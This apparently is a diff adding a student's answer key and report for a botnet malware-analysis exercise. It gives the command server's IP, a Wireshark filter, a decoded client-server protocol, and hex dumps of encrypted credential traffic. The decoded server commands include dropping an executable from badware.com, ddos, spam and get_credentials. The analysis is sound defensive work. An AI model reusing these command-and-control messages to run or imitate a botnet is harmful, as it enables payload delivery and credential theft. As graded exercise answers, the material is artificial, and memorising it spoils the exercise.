@@ -1,0 +1,91 @@
+### ANSWERS ###
+(a) IP = 18.185.126.2
+(b) Protocol = TCP
+(c) Version = 1.33.7 (linux)
+(d) Commands = ddos, spam, drop, get_credentials, hidden (optional) and sometimes an empty COMMAND ("COMMAND <END>")
+
+### REPORT ###
+Using wireshark, we find that the IP of the server the exe connects to is:  18.185.126.2
+Also, when we disabled this IP in our firewall, the program did not work anymore so that confirms our findings
+The botnet uses TCP, as can be seen in wireshark.
+
+# NOTE # 
+With this display filter we can filter out retransmissions in wireshark:
+not tcp.analysis.retransmission and not tcp.analysis.fast_retransmission and not tcp.analysis.out_of_order and not tcp.analysis.duplicate_ack
+This has helped us to get a clearer view of the message sent back and forth.
+
+# CONVERSATION #
+This is a typical conversation (note that commands may vary, they are listed below)
+Client -> server
+5245504f525420626f7469643d31626466373662363764373733656335206f733d6c696e7578203c454e443e0a
+=
+REPORT botid=1bdf76b67d773ec5 os=linux <END>
+
+Server -> client
+48454c4c4f2030386362366262353463203c454e443e0a
+=
+HELLO 08cb6bb54c <END>
+
+Client -> server
+5550444154452076657273696f6e3d312e33332e37203c454e443e0a
+=
+UPDATE version=1.33.7 <END>
+
+Server -> client
+555044415445206e6f6e65203c454e443e0a
+=
+UPDATE none <END>
+
+Client -> server
+434f4d4d414e44203c454e443e0a
+=
+COMMAND <END>
+
+Server -> client
+434f4d4d414e442064726f7020687474703a2f2f7777772e626164776172652e636f6d2f352e657865203c454e443e0a
+=
+COMMAND drop http://www.badware.com/5.exe <END>
+
+Client -> server
+444f4e45203c454e443e0a
+=
+DONE <END>
+
+Server -> client
+425945203c454e443e0a
+=
+BYE <END>
+
+# SEVERAL COMMANDS #
+These are several commands we got from the server:
+COMMAND ddos http://www.google.com <END>
+COMMAND spam http://www.badware.com/spam.template <END>
+COMMAND drop http://www.badware.com/5.exe <END>
+COMMAND get_credentials <END>
+
+
+# ENCRYPTION #
+After get_credentials:
+0000   20 e8 82 f0 c1 c9 d8 cb 8a 73 b5 2e 08 00 45 00
+0010   00 91 d4 f5 40 00 80 06 d2 43 c0 a8 01 ca 12 b9
+0020   7e 02 eb 69 15 00 fe f4 9a 1c 30 30 4d c9 50 18
+0030   04 02 d5 3e 00 00 50 cd d5 ad d4 fd 6a b2 0c e9
+0040   d9 67 78 8f a4 fa c4 17 ca c3 b4 d8 54 a8 55 1b
+0050   21 11 12 eb 86 3d 62 3b e7 c2 33 ac cc 98 c6 df
+0060   5a 6f c3 a9 4e 22 d5 d7 98 d7 54 21 f3 c7 13 59
+0070   a8 bc 46 4e 1f 21 12 5a c6 ae 33 8c 32 33 fc bc
+0080   d7 be 69 7a ab 5c b8 2d 8b f8 09 10 98 b1 fb 51
+0090   2b 62 92 c8 87 13 01 f0 20 3c 45 4e 44 3e 0a
+
+Also after get_credentials:
+0000   20 e8 82 f0 c1 c9 d8 cb 8a 73 b5 2e 08 00 45 00
+0010   00 91 d6 15 40 00 80 06 d1 23 c0 a8 01 ca 12 b9
+0020   7e 02 ec bf 15 00 05 94 ab ef 13 df 45 7c 50 18
+0030   04 02 0d 24 00 00 3f 41 f8 9a 25 40 d8 24 29 2d
+0040   3a ae 9c 3c 7c a1 2e d5 35 7f fe 92 62 3e 66 ca
+0050   3c 8a 43 32 12 4b fe e8 e0 26 d1 4b 4b c6 1f 83
+0060   a4 d7 d0 30 c6 b9 d2 4f 4e 77 38 09 d0 45 f9 3c
+0070   c5 1d a1 4b 53 ae fe 93 d6 79 7d 26 2a b1 96 78
+0080   50 45 85 29 8d 01 f5 8f cd f4 78 e7 b3 79 63 e4
+0090   9b ee 57 e1 c7 4a 62 30 20 3c 45 4e 44 3e 0a
+
